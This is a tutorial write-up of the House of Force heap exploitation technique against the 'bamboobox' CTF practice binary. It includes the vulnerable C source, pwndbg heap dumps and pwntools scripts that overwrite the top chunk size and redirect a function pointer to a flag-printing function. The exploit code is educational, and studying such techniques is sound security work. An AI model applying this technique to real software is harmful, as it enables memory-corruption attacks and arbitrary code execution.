
# The House of Force


This is one of the first technique that I started learning when I got into heap exploitation which is because this seems to be very basic technique came on 2004 fron the article malloc maleficium(reading it as of now), first few days are going to be hard as to understand the heap exploiation one needs to know the internal functioning of the malloc and free and most importantly how it is going to be managed.



# Theory

The theory behind this attack is overwriting the `top_chunk` size field to of maximum value the binary can hold usually `-1` or `0xffffffffffffff`. Once overwritten we can shift the wilderness chunk which is an alias of top chunk to the desired location and then do an arbitrary overwrite by making the malloc to return a desired pointer which we can overwrite it with.


# Constraints to Perform


Well, in order to perform this attack we need to have an overflow vulnerability in the input and that input has to be adjacent to the top_chunk field.

* An overflow vulnerability in the input field to overwrite the top_chunk field size.
* Have control over the size of allocation of malloc.


# Example

Heap exploitation is bascially about the practical example, I am going to take the following example which I will workon to showcase the House of Force.

```C
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
struct item {
  int size;
  char *name;
};

struct item itemlist[100] = {0};

int num;

void hello_message() {
  puts("There is a box with magic");
  puts("what do you want to do in the box");
}

void goodbye_message() {
  puts("See you next time");
  puts("Thanks you");
}

struct box {
  void (*hello_message)();
  void (*goodbye_message)();
};

void menu() {
  puts("----------------------------");
  puts("Bamboobox Menu");
  puts("----------------------------");
  puts("1.show the items in the box");
  puts("2.add a new item");
  puts("3.change the item in the box");
  puts("4.remove the item in the box");
  puts("5.exit");
  puts("----------------------------");
  printf("Your choice:");
}

void show_item() {
  int i;
  if (!num) {
    puts("No item in the box");
  } else {
    for (i = 0; i < 100; i++) {
      if (itemlist[i].name) {
        printf("%d : %s", i, itemlist[i].name);
      }
    }
    puts("");
  }
}

int add_item() {

  char sizebuf[8];
  int length;
  int i;
  int size;
  if (num < 100) {
    printf("Please enter the length of item name:");
    read(0, sizebuf, 8);
    length = atoi(sizebuf);
    if (length == 0) {
      puts("invaild length");
      return 0;
    }
    for (i = 0; i < 100; i++) {
      if (!itemlist[i].name) {
        itemlist[i].size = length;
        itemlist[i].name = (char *)malloc(length);
        printf("Please enter the name of item:");
        size = read(0, itemlist[i].name, length);
        itemlist[i].name[size] = '\x00';
        num++;
        break;
      }
    }

  } else {
    puts("the box is full");
  }
  return 0;
}

void change_item() {

  char indexbuf[8];
  char lengthbuf[8];
  int length;
  int index;
  int readsize;

  if (!num) {
    puts("No item in the box");
  } else {
    printf("Please enter the index of item:");
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      printf("Please enter the length of item name:");
      read(0, lengthbuf, 8);
      length = atoi(lengthbuf);
      printf("Please enter the new name of the item:");
      readsize = read(0, itemlist[index].name, length);
      *(itemlist[index].name + readsize) = '\x00';
    } else {
      puts("invaild index");
    }
  }
}

void remove_item() {
  char indexbuf[8];
  int index;

  if (!num) {
    puts("No item in the box");
  } else {
    printf("Please enter the index of item:");
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      free(itemlist[index].name);
      itemlist[index].name = 0;
      itemlist[index].size = 0;
      puts("remove successful!!");
      num--;
    } else {
      puts("invaild index");
    }
  }
}

void magic() {
  int fd;
  char buffer[100];
  fd = open("./flag", O_RDONLY);
  read(fd, buffer, sizeof(buffer));
  close(fd);
  printf("%s", buffer);
  exit(0);
}

int main() {

  char choicebuf[8];
  int choice;
  struct box *bamboo;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  bamboo = malloc(sizeof(struct box));
  bamboo->hello_message = hello_message;
  bamboo->goodbye_message = goodbye_message;
  bamboo->hello_message();

  while (1) {
    menu();
    read(0, choicebuf, 8);
    choice = atoi(choicebuf);
    switch (choice) {
    case 1:
      show_item();
      break;
    case 2:
      add_item();
      break;
    case 3:
      change_item();
      break;
    case 4:
      remove_item();
      break;
    case 5:
      bamboo->goodbye_message();
      exit(0);
      break;
    default:
      puts("invaild choice!!!");
      break;
    }
  }

  return 0;
}
```

#### Important Functions


Following 2 functions are the one concerning:-

```C
int add_item() {

  char sizebuf[8];
  int length;
  int i;
  int size;
  if (num < 100) {
    printf("Please enter the length of item name:");
    read(0, sizebuf, 8);
    length = atoi(sizebuf);
    if (length == 0) {
      puts("invaild length");
      return 0;
    }
    for (i = 0; i < 100; i++) {
      if (!itemlist[i].name) {
        itemlist[i].size = length;
        itemlist[i].name = (char *)malloc(length);
        printf("Please enter the name of item:");
        size = read(0, itemlist[i].name, length);
        itemlist[i].name[size] = '\x00';
        num++;
        break;
      }
    }

  } else {
    puts("the box is full");
  }
  return 0;
}

void change_item() {

  char indexbuf[8];
  char lengthbuf[8];
  int length;
  int index;
  int readsize;

  if (!num) {
    puts("No item in the box");
  } else {
    printf("Please enter the index of item:");
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      printf("Please enter the length of item name:");
      read(0, lengthbuf, 8);
      length = atoi(lengthbuf);
      printf("Please enter the new name of the item:");
      readsize = read(0, itemlist[index].name, length);
      *(itemlist[index].name + readsize) = '\x00';
    } else {
      puts("invaild index");
    }
  }
}
```

The `add_item` tends to take an input with variable `sizebuf` and then convert it to integer of variable `length` which will determine the size of the chunk we will allocate, after that we give input via `read` which will then store in the name, once done these two variables will be stored in a `itemlist` which is a global array that stores the references of `items` we allocated.

The next function `change_item` is a very crucial one here since this one tends to take the input at a certain index and we can define the size again(what the heck!!!) and the give the input accordingly then update the pointer in the `itemlist`. So, what's the issue here? Oh well, taking a closer look at the "updating the address in the itemlist" part we see that it's only updating the `name` member of the struct `item` which left the `size` being the same.

# Overwriting the top_chunk `size` field.

The `pwndbg`, say whatever this is the best debugger with enhanced abilities to use in heap exploitation.

Let's start:-

```r
pwndbg> r
Starting program: /home/vagrant/sharedFolder/heap/house/house_of_force/bamboobox 
There is a box with magic
what do you want to do in the box
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:2
Please enter the length of item name:5  
Please enter the name of item:aaaa
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:^C
Program received signal SIGINT, Interrupt.
0x00007ffff7af4081 in __GI___libc_read (fd=0, buf=0x7fffffffe650, nbytes=8) at ../sysdeps/unix/sysv/linux/read.c:27

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------

0x603250	0x0000000000000000	0x0000000000000021	........!.......
0x603260	0x0000000000400896	0x00000000004008b1	..@.......@.....
0x603270	0x0000000000000000	0x0000000000000021	........!.......
0x603280	0x0000000a61616161	0x0000000000000000	aaaa............
0x603290	0x0000000000000000	0x0000000000020d71	........q.......	 <-- Top chunk
pwndbg> 
pwndbg> x/2xg 0x00000000006020c0
0x6020c0 <itemlist>:	0x0000000000000005	0x0000000000603280
pwndbg> p/d 0x5
$4 = 5

```

Since we allocatd a `item` of size `5` and given 4 `a` and a linefeed(yes, it's using `read`) now, but the input we gave it is almost 24 bytes away from `top_chunk` but we gave `5`, this happened because malloc allocate a chunk of default size of `24` if the size specified is between `0-23`.

THe `itemlist` shows us that we have specified the size `0x5` and a pointer to heap chunk where the data resides.


Let's change the item and see what happens.

```C
pwndbg> c
Continuing.
3
Please enter the index of item:0
Please enter the length of item name:30
Please enter the new name of the item:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:invaild choice!!!
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:^C


------------------------------------------------------
------------------------------------------------------

0x603260	0x0000000000400896	0x00000000004008b1	..@.......@.....
0x603270	0x0000000000000000	0x0000000000000021	........!.......
0x603280	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x603290	0x4242424242424242	0x0000424242424242	BBBBBBBBBBBBBB..	


0x603280	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x603290	0x4242424242424242	0x0000424242424242	BBBBBBBBBBBBBB..	 <-- Top chunk
pwndbg> x/2xg 0x00000000006020c0
0x6020c0 <itemlist>:	0x0000000000000005	0x0000000000603280
pwndbg> top_chunk
Top chunk
Addr: 0x603290
Size: 0x424242424242
pwndbg> 

```

We somehow overwritten the `top_chunk` size field and it seems to now have a value of `0x42424242424242` which the `B` we gave as the `name`. But the size of the chunk we allocated as depicted by the `itemlist` still appears ti be `5`. Why this happens?


Let's take a closer look:-


```C
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      printf("Please enter the length of item name:");
      read(0, lengthbuf, 8);
      length = atoi(lengthbuf);
      printf("Please enter the new name of the item:");
      readsize = read(0, itemlist[index].name, length)
```

So, first we give the `size` of the chunk we need to allocate so that it gets changed. Now, next it tends to take input but with the size given earlier, this is where overflow happens, the original size of the chunk will be `0x5` which in default be `24`(malloc, hah) then again when we change the item, specfiying the size field of the item itself.


Then, we give the `size` of 30, which allows us to givw input of size of 30 but the original chunk has size of 24, this will let us give extra 6 bytes of data resulting in `top_chunk` size field overwritten by those 6 bytes of data.


Using `pwntools` when we interact to the program and `add` the item of 24 size and then we change the item with of size 32 and give `"A"*24 + p32(0xdeadbeef)`, we get to see the size field of `top_chunk` has been overwriteen.

```r
0x1b02250	0x0000000000000000	0x0000000000000021	........!.......
0x1b02260	0x0000000000400896	0x00000000004008b1	..@.......@.....
0x1b02270	0x0000000000000000	0x0000000000000021	........!.......
0x1b02280	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x1b02290	0x4141414141414141	0x00000000deadbeef	AAAAAAAA........	 <-- Top chunk
```

Awesome, but this is where actual house of force exploitation technique begin to get an arbitrary overwrite. 

# Getting an Arbitrary Overwrite

First of all we need to make the top_chunk `size` value to largest unsigned long integer which is `-1`. Using the `pwntools` we change the item and then make the top_chunk size `-1`.

```py
from pwn import *


def add(size, data):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def edit(idx, size, data):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("item:", str(idx))
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def remove(idx):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("item:", str(idx))


p = process("./bamboobox")
elf = ELF("bamboobox")
pause()
add(24, "A"*24)
edit(0, 32 , b"A"*24 + p64(0xffffffffffffff))

p.interactive()
```

Running the script and then attach it to `-pwndbg` session, we get to see that:-

```r
pwndbg> top_chunk
Top chunk
Addr: 0xfa0290
Size: 0xfffffffffffffff
```

Awesome, let's move on to write something on the memory.


### Something interesting


```r
0xfa0260	0x0000000000400896	0x00000000004008b1	..@.......@.....
0xfa0270	0x0000000000000000	0x0000000000000021	........!.......
0xfa0280	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0xfa0290	0x4141414141414141	0x0fffffffffffffff	AAAAAAAA........	 <-- Top chunk
```


Why are we making the size of top_chunk to the unsigned integer? That is because the size of the top chunk denotes the size of the heap available for allocation, now when we tend to do overwrite it with maximum value, the malloc mechanisms thinks that we have very large amount of area available for allocation, hence the process map of the program is available within the grasp of malloc.


```r
---------------- 
|   PROGRAM    |   |  LOW
----------------   V
|    BSS       | 
----------------
----------------
|    HEAP      |   |
----------------   V
|    LIBC      |
----------------
|    STACK     |
----------------   |   HIGH
                   V
```


If we get to see the heap layout, we see that there are address from the `.text` section of functions which are being called when we tend to exit it. To be more precise, these functions are stored at just 0x21 bytes before the top_chunk sixze field which then can be crafted coorectly, now this will need almost more of 0x40 + 0x20 bytes which is difference between the top chunk and the address where we want the wilderness to move.

To be more precise:-


`0x40 + 0x20` : Difference between the heap addresses
`0xd`: This being the amount of neccessary bytes we need to overwrite.

So, when we give `- (0x40 + 0x20) - 0xd`, this will allocate the chunk to that of the address we want to move.

Then, we allocate this memory and give the address of the `magic` function we want to jump, hence making a fake chunk that resembles the original, making it execute the magic function.



```py
from pwn import *


def add(size, data):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def edit(idx, size, data):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("item:", str(idx))
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def remove(idx):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("item:", str(idx))


p = process("./bamboobox")
elf = ELF("bamboobox")
pause()
add(0x30, "A"*0x30)
edit(0, 0x40 , b"A"*0x30 + b"B"*8  + p64(0xffffffffffffffff))

heap_base = -(0x40 + 0x20)
malloc_size = heap_base - 0xd

add(malloc_size, "c"*4)
add(0x10, p64(0x400d49)*2)

p.interactive()

```



